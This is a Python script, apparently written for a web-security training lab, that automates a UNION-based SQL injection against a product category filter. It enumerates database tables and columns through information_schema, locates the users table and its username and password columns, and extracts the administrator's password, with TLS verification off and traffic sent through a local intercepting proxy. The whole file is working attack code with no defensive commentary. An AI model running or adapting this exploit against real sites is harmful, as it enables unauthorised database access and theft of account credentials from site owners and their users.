
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"

def perform_request(url, sql_payload):
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_exploit_users_column(url, users_table):
    sql_payload = f"' UNION SELECT column_name, null from information_schema.columns WHERE table_name = '{users_table}'--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = f"' UNION select {username_column}, {password_column} from {users_table}--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password


def exploit_users_table(url):
    sql_payload = "'union select table_name, null from information_schema.tables -- "
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

if __name__ == "__main__":
    try: 
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url>")
        print(f"[*] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    users_table = exploit_users_table(url)

    if users_table:
        print(f"The users table is: {users_table}")
        username_column, password_column = sqli_exploit_users_column(url, users_table)
        if username_column and password_column:
            print(f"The username column is: {username_column}")
            print(f"The password column is: {password_column}")

            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print(f"The administrator password is {admin_password}.")
            else:
                print("[+] Didnot find administrator password")
        else:
            print("Didnot find the username and/or password columns.")

    else:
        print("Didnot find users table.")